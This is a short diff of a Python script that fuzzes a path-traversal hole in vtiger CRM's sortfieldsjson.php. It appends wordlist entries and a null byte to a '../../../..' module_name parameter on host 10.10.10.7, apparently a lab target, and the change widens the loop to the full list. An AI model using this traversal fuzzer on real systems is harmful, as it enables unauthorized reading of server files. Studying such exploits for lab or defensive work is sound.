@@ -26,7 +26,7 @@ print '\n'
 base_fuzz_url = 'https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../..'
 null_byte = '%00'
 anomalies = []
-for line in f[0:10]:
+for line in f:
     try:
         line = line.strip()
         url = base_fuzz_url + line + null_byte
